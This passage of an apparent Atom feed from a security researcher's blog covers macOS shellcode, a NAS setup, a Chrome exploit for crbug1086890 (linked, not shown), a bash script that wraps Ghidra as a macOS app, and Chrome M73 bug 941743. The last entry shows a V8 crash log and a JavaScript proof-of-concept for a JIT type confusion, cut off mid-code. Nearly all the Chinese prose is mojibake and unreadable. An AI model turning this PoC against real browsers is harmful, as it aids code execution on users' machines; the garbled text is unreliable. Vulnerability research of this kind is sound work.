    <summary type="html">&lt;h2 id=&quot;shellcode-on-macOS&quot;&gt;&lt;a href=&quot;#shellcode-on-macOS&quot; class=&quot;headerlink&quot; title=&quot;shellcode on macOS&quot;&gt;&lt;/a&gt;shellcode on macOS&lt;/h2&gt;&lt;p&gt;æœ€è¿‘å› ä¸ºä¸€äº›å·¥ä½œä¸Šçš„éœ€æ±‚éœ€è¦æä¸‹macOSä¸Šçš„shellcdoeï¼Œè°·æ­Œäº†å¾ˆå¤šèµ„æ–™/ä»£ç åå‘ç°è¿˜æ˜¯æœ‰ä¸å°‘å‘çš„ï¼Œæˆ–è€…å°±æ˜¯ä»£ç æ¯”è¾ƒè€ï¼Œå®šåˆ¶åŒ–ç¨‹åº¦æ¯”è¾ƒé«˜ï¼Œä¸å¤ªç¬¦åˆæˆ‘çš„éœ€æ±‚ï¼Œå…¶å®æˆ‘éœ€æ±‚ä¹Ÿç®€å• pop calcæˆ–è€…reverse shellï¼Œå°±æ˜¯ä¸ªæ¼”ç¤ºæ•ˆæœ ğŸ¤£ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="exploit" scheme="http://o0xmuhe.me/categories/exploit/"/>
    
    
    <category term="macOS" scheme="http://o0xmuhe.me/tags/macOS/"/>
    
    <category term="exploit" scheme="http://o0xmuhe.me/tags/exploit/"/>
    
    <category term="shellcode" scheme="http://o0xmuhe.me/tags/shellcode/"/>
    
  </entry>
  
  <entry>
    <title>NASæŠ˜è…¾è®°å½•</title>
    <link href="http://o0xmuhe.me/2020/10/07/NAS%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/"/>
    <id>http://o0xmuhe.me/2020/10/07/NAS%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/</id>
    <published>2020-10-07T12:13:21.000Z</published>
    <updated>2021-06-09T14:35:02.457Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å…³äº"><a href="#å…³äº" class="headerlink" title="å…³äº"></a>å…³äº</h2><p>  å¤§æ¦‚äº”æœˆçš„æ—¶å€™ä¸¢å¤±äº†ä¸€æ³¢æ•°æ®ï¼Œå¤§æ¦‚ä¸åˆ°2TBï¼Œè™½ç„¶æœ€åæ•‘å›æ¥äº†ä¸€éƒ¨åˆ†ï¼Œä½†æ˜¯ä»ç„¶è®©æˆ‘å¿ƒæœ‰ä½™æ‚¸ï¼Œç”Ÿæ€•è¿™æ ·çš„æƒ…å†µå†æ¬¡å‘ç”Ÿï¼Œç´¢æ€§ç”³è¯·èµ„é‡‘ä¹°NASï¼Œç”±äºæœ¬èº«åˆä¸æŠ˜è…¾ç¡¬ä»¶ä»€ä¹ˆçš„ï¼Œå°±ç›´æ¥ä¸€æ­¥åˆ°ä½é€‰æ‹©äº†ç¾¤æ™–DS218+ï¼ŒåŒç›˜ä½ï¼Œx86ï¼Œå¤ŸæŠ˜è…¾äº†ã€‚</p><a id="more"></a><p>å› ä¸ºæ˜¯ä¸¤ç›˜ä½ï¼Œæ‰€ä»¥å°½é‡ç¡¬ç›˜é€‰æ‹©çš„å¤§ä¸€ç‚¹ï¼Œä¸ç„¶åç»­ç½®æ¢å¾ˆéº»çƒ¦ï¼Œè€Œä¸”ä¸ºäº†ä¿è¯æ•°æ®å®‰å…¨è‚¯å®šæ˜¯è¦åšraidçš„ï¼Œæˆ‘è¿™é‡Œç›´æ¥ä¹°äº†ä¸¤å—å¸Œæ·çš„8Tä¼ä¸šç›˜ï¼Œè‚‰ç–¼æ˜¯è‚¯å®šçš„ï¼Œä½†æ˜¯æ¢æ¥çš„æ˜¯å¤§å®¹é‡+å®‰å…¨æ€§ï¼Œæ‰€ä»¥è¿˜æ˜¯ç‰©æœ‰æ‰€å€¼ï¼›æœ€åè¿˜ç»™NASåŠ äº†ä¸€æ¡å†…å­˜ï¼Œæ–¹ä¾¿åé¢æŠ˜è…¾dockerã€‚</p><h2 id="å¥—ä»¶-amp-amp-Docker"><a href="#å¥—ä»¶-amp-amp-Docker" class="headerlink" title="å¥—ä»¶&amp;&amp;Docker"></a>å¥—ä»¶&amp;&amp;Docker</h2><p>  æˆ‘æœ¬èº«ä½¿ç”¨NASå°±æ˜¯ä¸ºäº†æ•°æ®å¤‡ä»½ï¼Œæ‰€ä»¥ç¾¤æ™–æä¾›çš„å¥—ä»¶è¿˜æ˜¯ååˆ†å®ç”¨ï¼Œæœ‰ç§ä¹°è½¯ä»¶é€NASçš„æ„Ÿè§‰ï¼Œæ‰‹æœºç›¸å†Œç›´æ¥ä½¿ç”¨<code>Monments</code>å¤‡ä»½äº†ï¼Œmacå¯ä»¥tmå¤‡ä»½ä¸Šå»ï¼Œä¸è¿‡æˆ‘è¿˜æ˜¯ä¸“é—¨å‡†å¤‡äº†ä¸€å—2tçš„ç§»åŠ¨ç¡¬ç›˜ç»™macåštmå¤‡ä»½ï¼Œé‡è¦çš„æ–‡ä»¶ä¼šé€‰æ‹©å¤šå¤„å¤‡ä»½ï¼Œç›´æ¥ç”¨äº†ç¾¤æ™–çš„<code>Synology Drive</code>ç»™åŒæ­¥åˆ°äº†NASä¸Šï¼Œå½“ç„¶è¿™äº›éƒ½æ¯”è¾ƒç®€å•åŸºç¡€ã€‚</p><p>  ä¸ºäº†éšæ—¶èƒ½è¿ä¸Šnasä½¿ç”¨ï¼Œç¾¤æ™–è™½ç„¶æä¾›äº†quick connectï¼Œä½†æ˜¯æ¶‰åŠåˆ°NASä¸Šè·‘ç€çš„ä¸€äº›dockerçš„æ—¶å€™ï¼Œè¿™æ ·å°±å¾ˆä¸æ–¹ä¾¿äº†ï¼›æ‰€ä»¥æˆ‘æ‰¾è”é€šå¼€äº†å…¬ç½‘ipï¼Œç„¶åNASè®¾ç½®é‡Œå¼€äº†DDNSï¼Œç„¶åå¯ä»¥ç”¨ç¾¤æ™–æä¾›çš„åŸŸåç›´æ¥æ¥è®¿é—®è‡ªå·±çš„NASäº†ï¼Œä¸è¿‡ä¸ºäº†å®‰å…¨èµ·è§ï¼Œæˆ‘å¼€äº†ä¸€äº›å®‰å…¨ç­–ç•¥ä»¥åŠbanæ‰äº†éå¿…é¡»ç«¯å£ï¼Œå¹¶ä¸”å¼€äº†SSLã€‚</p><p>åœ¨æœ‰å…¬ç½‘ipçš„æƒ…å†µä¸‹ï¼Œå°±å¯ä»¥å¼€å§‹é€ ä½œäº†ï¼Œæˆ‘æŠ˜è…¾çš„æ¯”è¾ƒå¤šçš„æ˜¯dockerï¼š</p><ol><li>gitea</li><li>snell docker(for proxy)</li><li>Aria2 </li><li>Ubuntu &amp;&amp; mongodb</li></ol><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/NAS_log/CleanShot%202020-10-07%20at%2020.27.57%402x.png"></p><p>ä¸ºäº†ä¸æš´éœ²å¤ªå¤šç«¯å£å‡ºæ¥ï¼ˆgiteaçš„ï¼Œubuntuçš„å•¥çš„ï¼‰ï¼Œæˆ‘çš„è®¾æƒ³æ˜¯åªæš´éœ²ä¸€ä¸ªä»£ç†çš„ç«¯å£ï¼Œç„¶åæˆ‘è¿ä¸Šä»£ç†ï¼Œå…¶ä»–çš„å®¹å™¨é€šè¿‡ä»£ç†æœ¬åœ°è®¿é—®ï¼Œè¿™æ ·èƒ½æœ€å¤§é™åº¦å‡å°‘é£é™©ï¼Œä»£ç†çš„è¯ä¹Ÿä¸é€‰ç”¨å¸¸ç”¨çš„ï¼Œæˆ–è€…è¯´è‡ªå·±åšä¸€äº›ä¿®æ”¹ã€‚</p><p>è‡ªå·±æä¸ªgitç”¨çœŸèˆ’æœå•Šï¼Œgitlabå¤ªé‡äº†ï¼Œä¸ªäººä½¿ç”¨çš„è¯æ²¡å¿…è¦ï¼Œgiteaæ¯”è¾ƒè½»é‡çº§ï¼ŒçœŸé¦™ã€‚</p><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/NAS_log/CleanShot%202020-10-07%20at%2020.35.05%402x.png"></p><p>æ€»ä¹‹è¿™è¿˜æ˜¯è›®é¦™çš„ï¼Œé…ç½®å¥½aria2åï¼Œä¸‹ç”µå½±å†ç»“åˆç¾¤æ™–çš„<code>Video Station</code> å®¶åº­å½±é™¢åˆ†åˆ†é’Ÿæèµ·ï¼Œè¿˜èƒ½éšæ—¶éšåœ°å­¦ä¹ ï¼ŒçœŸé¦™ ğŸ˜„</p><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/NAS_log/CleanShot%202020-10-07%20at%2020.37.06%402x.png"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;å…³äº&quot;&gt;&lt;a href=&quot;#å…³äº&quot; class=&quot;headerlink&quot; title=&quot;å…³äº&quot;&gt;&lt;/a&gt;å…³äº&lt;/h2&gt;&lt;p&gt;  å¤§æ¦‚äº”æœˆçš„æ—¶å€™ä¸¢å¤±äº†ä¸€æ³¢æ•°æ®ï¼Œå¤§æ¦‚ä¸åˆ°2TBï¼Œè™½ç„¶æœ€åæ•‘å›æ¥äº†ä¸€éƒ¨åˆ†ï¼Œä½†æ˜¯ä»ç„¶è®©æˆ‘å¿ƒæœ‰ä½™æ‚¸ï¼Œç”Ÿæ€•è¿™æ ·çš„æƒ…å†µå†æ¬¡å‘ç”Ÿï¼Œç´¢æ€§ç”³è¯·èµ„é‡‘ä¹°NASï¼Œç”±äºæœ¬èº«åˆä¸æŠ˜è…¾ç¡¬ä»¶ä»€ä¹ˆçš„ï¼Œå°±ç›´æ¥ä¸€æ­¥åˆ°ä½é€‰æ‹©äº†ç¾¤æ™–DS218+ï¼ŒåŒç›˜ä½ï¼Œx86ï¼Œå¤ŸæŠ˜è…¾äº†ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="å…¶ä»–" scheme="http://o0xmuhe.me/categories/%E5%85%B6%E4%BB%96/"/>
    
    
    <category term="å…¶ä»–" scheme="http://o0xmuhe.me/tags/%E5%85%B6%E4%BB%96/"/>
    
  </entry>
  
  <entry>
    <title>exploit for crbug1086890</title>
    <link href="http://o0xmuhe.me/2020/08/27/exploit-for-crbug1086890/"/>
    <id>http://o0xmuhe.me/2020/08/27/exploit-for-crbug1086890/</id>
    <published>2020-08-27T07:07:08.000Z</published>
    <updated>2020-08-27T07:25:27.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="bug-info"><a href="#bug-info" class="headerlink" title="bug info"></a>bug info</h2><p>æ¥è‡ªpj0çš„<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2046">glazunov</a>çš„æ´ï¼Œä¸€ä¸ªJITä¼˜åŒ–ä¸­çš„æ´ï¼Œç¼ºå°‘è¾¹ç•Œæ£€æŸ¥æœ€ç»ˆå¯¼è‡´oob r/wã€‚</p><a id="more"></a><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><p>æ¯”è¾ƒä¸å¥½çš„åœ°æ–¹å°±æ˜¯éœ€è¦å¤§æ¦‚çŒœä¸€ä¸‹é‚£ä¸ªoobarrayçš„elementsçš„åœ°å€ï¼Œä½¿å¾—æˆ‘ä»¬æƒ³ç”¨æ¥aar/wçš„arrayæˆ–è€…arraybufferè½åœ¨è¿™åé¢ï¼Œå¤§æ¦‚è°ƒæ•´ä¸ªåç§»ä½¿å¾—èƒ½å¤Ÿæ­£å¸¸è¯»å†™åˆ°å°±è¡Œã€‚</p><p>æµ‹è¯•ç‰ˆæœ¬:83.0.4103.61 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Commit: 88bff78e26dbd25dcbb342d4b07c7e66c0f048be</span><br><span class="line">Branch Base Commit: 8ad47e8d21f6866e4a37f47d83a860d41debf514</span><br><span class="line">Branch Base Position: 756066</span><br><span class="line">V8 Commit: 3b627511511f00c552ced504c1f182bdcc3480af</span><br><span class="line">V8 Version: 8.3.110.9</span><br><span class="line">V8 Position: 19</span><br><span class="line">Skia Commit: c3d05a789930913af94174961bc6f90894196f62</span><br></pre></td></tr></table></figure><ul><li>è°ƒè¯•ä¼šæ¯”è¾ƒéº»çƒ¦ç‚¹ï¼Œgdb ç›´æ¥èµ·è§¦å‘æœ‰é—®é¢˜ï¼ˆæˆ‘è¿™é‡Œæ˜¯ï¼‰ï¼Œæˆ‘æ˜¯å¼€äº†coredumpï¼Œç„¶åè§¦å‘crashçœ‹çœ‹å†…å­˜å•¥çš„è°ƒçš„ã€‚</li><li>biguint64 è¿˜æ˜¯ arraybufferéƒ½è¡Œï¼Œå–œæ¬¢å•¥ç”¨å•¥ã€‚</li><li>æƒ³æˆåŠŸç‡é«˜ï¼Œè¦ç”¨web workerï¼ˆæˆ‘è§‰å¾—ï¼‰ï¼Œè¦ä¹ˆæ­»çŒœå‡ ä¸ªåœ°å€ï¼Œè¦ä¹ˆéšæœºæ’å¤§è¿ã€‚</li></ul><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/crbug1086890/CleanShot%202020-08-27%20at%2011.26.03.png" alt="exploit linux d8"></p><p><a href="https://github.com/o0xmuhe/RealWorldPwn/tree/master/chrome_M83_crbug1086890_RCE">å®Œæ•´åˆ©ç”¨ä»£ç </a></p><hr><p>è§‰å¾—æœ‰ç”¨çš„æœ‹å‹å¯ä»¥æ‰“èµä¸€æ¯â˜•ï¸ :)</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;bug-info&quot;&gt;&lt;a href=&quot;#bug-info&quot; class=&quot;headerlink&quot; title=&quot;bug info&quot;&gt;&lt;/a&gt;bug info&lt;/h2&gt;&lt;p&gt;æ¥è‡ªpj0çš„&lt;a href=&quot;https://bugs.chromium.org/p/project-zero/issues/detail?id=2046&quot;&gt;glazunov&lt;/a&gt;çš„æ´ï¼Œä¸€ä¸ªJITä¼˜åŒ–ä¸­çš„æ´ï¼Œç¼ºå°‘è¾¹ç•Œæ£€æŸ¥æœ€ç»ˆå¯¼è‡´oob r/wã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="exploit" scheme="http://o0xmuhe.me/categories/exploit/"/>
    
    
    <category term="exploit" scheme="http://o0xmuhe.me/tags/exploit/"/>
    
    <category term="chrome" scheme="http://o0xmuhe.me/tags/chrome/"/>
    
  </entry>
  
  <entry>
    <title>make-script-to-macOS App</title>
    <link href="http://o0xmuhe.me/2020/08/07/make-script-to-macOS-App/"/>
    <id>http://o0xmuhe.me/2020/08/07/make-script-to-macOS-App/</id>
    <published>2020-08-07T04:46:24.000Z</published>
    <updated>2020-08-07T04:56:04.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-éœ€æ±‚"><a href="#0x00-éœ€æ±‚" class="headerlink" title="0x00 : éœ€æ±‚"></a>0x00 : éœ€æ±‚</h2><p>ä¸»è¦æ˜¯Ghidraè¿™ä¸ªä¸œè¥¿ï¼Œæ¯æ¬¡å¯åŠ¨éƒ½è¦å‘½ä»¤è¡Œ <code>GhidraRun</code>ï¼Œå¤ªéº»çƒ¦äº†ï¼Œæ‰€ä»¥å°±æƒ³æŠŠè¿™ä¸ªå¯åŠ¨è„šæœ¬å°è£…æˆä¸€ä¸ªmacOSçš„APPï¼Œæ–¹ä¾¿ä½¿ç”¨ã€‚</p><a id="more"></a><h2 id="0x01-è¿‡ç¨‹"><a href="#0x01-è¿‡ç¨‹" class="headerlink" title="0x01 : è¿‡ç¨‹"></a>0x01 : è¿‡ç¨‹</h2><p>ç›´æ¥ä½¿ç”¨äº† <a href="https://gist.github.com/mathiasbynens/674099">åˆ«äººå†™å¥½çš„appfiy.sh</a> ï¼Œæˆ‘ç”¨çš„æ˜¯åŸä½œè€…çš„ï¼Œé“¾æ¥é‡Œçš„æ˜¯äºŒæ¬¡å¼€å‘çš„ï¼Œå…¶å®æœ¬è´¨æ˜¯ä¸€æ ·çš„ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"></span><br><span class="line">APPNAME=<span class="variable">$&#123;2:-$(basename &quot;<span class="variable">$&#123;1&#125;</span>&quot; &#x27;.sh&#x27;)&#125;</span>;</span><br><span class="line">DIR=<span class="string">&quot;<span class="variable">$&#123;APPNAME&#125;</span>.app/Contents/MacOS&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -a <span class="string">&quot;<span class="variable">$&#123;APPNAME&#125;</span>.app&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;PWD&#125;</span>/<span class="variable">$&#123;APPNAME&#125;</span>.app already exists :(&quot;</span>;</span><br><span class="line"><span class="built_in">exit</span> 1;</span><br><span class="line"><span class="keyword">fi</span>;</span><br><span class="line"></span><br><span class="line">mkdir -p <span class="string">&quot;<span class="variable">$&#123;DIR&#125;</span>&quot;</span>;</span><br><span class="line">cp <span class="string">&quot;<span class="variable">$&#123;1&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;DIR&#125;</span>/<span class="variable">$&#123;APPNAME&#125;</span>&quot;</span>;</span><br><span class="line">chmod +x <span class="string">&quot;<span class="variable">$&#123;DIR&#125;</span>/<span class="variable">$&#123;APPNAME&#125;</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;PWD&#125;</span>/<span class="variable">$APPNAME</span>.app&quot;</span>;</span><br></pre></td></tr></table></figure><p>å› ä¸ºmacOSä¸‹appæœ¬è´¨æ˜¯ä¸€ä¸ªç›®å½•ï¼Œæ‰€ä»¥åªéœ€è¦æŒ‰ç…§ç‰¹å®šçš„æ ¼å¼æ„å»ºè¿™ä¸ªç›®å½•å³å¯ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">â¯ <span class="built_in">cd</span> /Applications/Ghidra.app</span><br><span class="line">â•­â”€ ï…¹ î‚° ï„• /Applications/Ghidra.app î‚°Â·Â·î‚² âœ” î‚² at 12:51:35 ï€—</span><br><span class="line">â•°â”€</span><br><span class="line">â¯ ls</span><br><span class="line">Contents Icon?</span><br><span class="line">â¯ tree .</span><br><span class="line">.</span><br><span class="line">â”œâ”€â”€ Contents</span><br><span class="line">â”‚Â Â  â””â”€â”€ MacOS</span><br><span class="line">â”‚Â Â      â””â”€â”€ Ghidra</span><br><span class="line">â””â”€â”€ Icon\r</span><br></pre></td></tr></table></figure><p>æœ¬æ¥æˆ‘æ˜¯æŠŠghridaçš„å¯åŠ¨è„šæœ¬ç›´æ¥æ”¾è¿›æ¥çš„ï¼Œä½†æ˜¯å‘ç°æœ‰ä¸€äº›ç›®å½•çš„é—®é¢˜ï¼Œç´¢æ€§ç›´æ¥ç»å¯¹è·¯å¾„å¯åŠ¨è¿™ä¸ªè„šæœ¬å¥½äº†(æ‡’çœäº‹å„¿å•Š hhh)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#----------------------------------------</span></span><br><span class="line"><span class="comment"># Ghidra launch</span></span><br><span class="line"><span class="comment">#----------------------------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/Users/muhe/Tools/ghidra/ghidraRun</span><br></pre></td></tr></table></figure><p>æœ€åï¼Œå›¾æ ‡å¯ä»¥å…ˆå¤åˆ¶ä½ æƒ³ç”¨çš„å›¾ç‰‡ï¼Œç„¶åå¯¹appå³é”®ï¼Œget infoï¼Œç‚¹å‡»ä¿¡æ¯æ ä¸Šé¢çš„å°å›¾æ ‡ï¼Œä¹‹åcmd+vå°±è¡Œäº†ï¼Œä¹ŸæŒºæ–¹ä¾¿ã€‚</p><p>æœ€åï¼Œå°±å¯ä»¥å¾ˆèˆ’æœçš„å¯åŠ¨äº†ã€‚</p><h2 id="0x02-å‚è€ƒ"><a href="#0x02-å‚è€ƒ" class="headerlink" title="0x02 : å‚è€ƒ"></a>0x02 : å‚è€ƒ</h2><p><a href="https://mathiasbynens.be/notes/shell-script-mac-apps">shell-script-mac-apps</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-éœ€æ±‚&quot;&gt;&lt;a href=&quot;#0x00-éœ€æ±‚&quot; class=&quot;headerlink&quot; title=&quot;0x00 : éœ€æ±‚&quot;&gt;&lt;/a&gt;0x00 : éœ€æ±‚&lt;/h2&gt;&lt;p&gt;ä¸»è¦æ˜¯Ghidraè¿™ä¸ªä¸œè¥¿ï¼Œæ¯æ¬¡å¯åŠ¨éƒ½è¦å‘½ä»¤è¡Œ &lt;code&gt;GhidraRun&lt;/code&gt;ï¼Œå¤ªéº»çƒ¦äº†ï¼Œæ‰€ä»¥å°±æƒ³æŠŠè¿™ä¸ªå¯åŠ¨è„šæœ¬å°è£…æˆä¸€ä¸ªmacOSçš„APPï¼Œæ–¹ä¾¿ä½¿ç”¨ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="ç¯å¢ƒé…ç½®" scheme="http://o0xmuhe.me/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    
    
    <category term="tools" scheme="http://o0xmuhe.me/tags/tools/"/>
    
  </entry>
  
  <entry>
    <title>Chrome M73 issue 941743</title>
    <link href="http://o0xmuhe.me/2020/06/20/Chrome-M73-issue-941743/"/>
    <id>http://o0xmuhe.me/2020/06/20/Chrome-M73-issue-941743/</id>
    <published>2020-06-19T16:41:53.000Z</published>
    <updated>2020-06-20T11:07:18.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-bug-info"><a href="#1-bug-info" class="headerlink" title="1. bug info"></a>1. bug info</h2><p>è¿™æ˜¯ç§‘æ©å®éªŒå®¤19å¹´ blackhat USAè®®é¢˜ä¸­é‚£å¥—åˆ©ç”¨çš„rceéƒ¨åˆ†ï¼Œv8 JITä¼˜åŒ–çš„æ¼æ´ã€‚</p><p>ç±»å‹æ··æ·†æ¼æ´ã€‚</p><a id="more"></a><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">âœ  ~ ~/v8/v8/out/x64.debug/d8    ~/chrome_M73_crbug941743_RCE/raw_poc.js </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Fatal error in ../../src/elements.cc, line 881</span></span><br><span class="line"><span class="comment"># Debug check failed: IsFastElementsKind(from_kind).</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#FailureMessage Object: 0x7fff3b6caa70</span></span><br><span class="line">==== C stack trace ===============================</span><br><span class="line"></span><br><span class="line">    /home/jack/v8/v8/out/x64.debug/libv8_libbase.so(v8::base::debug::StackTrace::StackTrace()+0x1e) [0x7f95be106e1e]</span><br><span class="line">    /home/jack/v8/v8/out/x64.debug/libv8_libplatform.so(+0x2d527) [0x7f95be0ac527]</span><br><span class="line">    /home/jack/v8/v8/out/x64.debug/libv8_libbase.so(V8_Fatal(char const*, int, char const*, ...)+0x218) [0x7f95be0f4fb8]</span><br><span class="line">    /home/jack/v8/v8/out/x64.debug/libv8_libbase.so(+0x349fc) [0x7f95be0f49fc]</span><br><span class="line">    /home/jack/v8/v8/out/x64.debug/libv8_libbase.so(V8_Dcheck(char const*, int, char const*)+0x32) [0x7f95be0f5092]</span><br><span class="line">    /home/jack/v8/v8/out/x64.debug/libv8.so(+0x1585f80) [0x7f95bcf27f80]</span><br><span class="line">    /home/jack/v8/v8/out/x64.debug/libv8.so(+0x1582a31) [0x7f95bcf24a31]</span><br><span class="line">    /home/jack/v8/v8/out/x64.debug/libv8.so(+0x1a8b5b8) [0x7f95bd42d5b8]</span><br><span class="line">    /home/jack/v8/v8/out/x64.debug/libv8.so(v8::internal::Runtime_TransitionElementsKind(int, unsigned long*, v8::internal::Isolate*)+0x117) [0x7f95bd42d247]</span><br><span class="line">    /home/jack/v8/v8/out/x64.debug/libv8.so(+0x212bd00) [0x7f95bdacdd00]</span><br><span class="line">Received signal 4 ILL_ILLOPN 7f95be104581</span><br><span class="line">[1]    8542 illegal hardware instruction (core dumped)  ~/v8/v8/out/x64.debug/d8 ~/chrome_M73_crbug941743_RCE/raw_poc.js</span><br></pre></td></tr></table></figure><h2 id="2-poc"><a href="#2-poc" class="headerlink" title="2. poc"></a>2. poc</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Impact version: 6.1.462+ </span></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; <span class="number">300</span>; ++i) &#123;</span><br><span class="line">    <span class="keyword">var</span> a2 = arr.map(<span class="function"><span class="keyword">function</span> (<span class="params">v, i</span>) </span>&#123;</span><br><span class="line">        arr.push(<span class="number">1</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    arr.some(arr.constructor);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; <span class="number">1000000</span>; ++j) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="string">``</span><span class="string">` </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1. array.map æ–¹æ³•ï¼Œå¯¹arrayä¸­æ¯ä¸ªå…ƒç´ æ‰§è¡Œå‚æ•°æŒ‡å®šçš„æ“ä½œï¼Œç„¶åè¿”å›ä¸€ä¸ªæ–°çš„æ•°æ®</span></span><br><span class="line"><span class="string">2. array.some æ–¹æ³•ï¼Œæ˜¯ä¸€ä¸ªæ£€æµ‹</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">![](https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/Chrome-M73-issue-941743/15904645923418.jpg)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">è¿™ä¸ªpatchåœ¨è¿™ä¸ªæ¼æ´ä¿®è¡¥çš„commité‡Œæ˜¯æœ‰çš„ï¼Œå°±è¿™ä¸ªpocï¼š</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">`</span><span class="string">``</span>javascript</span><br><span class="line"><span class="comment">// Copyright 2019 the V8 project authors. All rights reserved.</span></span><br><span class="line"><span class="comment">// Use of this source code is governed by a BSD-style license that can be</span></span><br><span class="line"><span class="comment">// found in the LICENSE file.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Flags: --allow-natives-syntax --noenable-slow-asserts</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// This call ensures that TurboFan won&#x27;t inline array constructors.</span></span><br><span class="line"><span class="built_in">Array</span>(<span class="number">2</span>**<span class="number">30</span>);</span><br><span class="line"><span class="comment">// Set up a fast holey smi array, and generate optimized code.</span></span><br><span class="line"><span class="keyword">let</span> a = [<span class="number">1</span>, <span class="number">2</span>, ,,, <span class="number">3</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mapping</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line"> 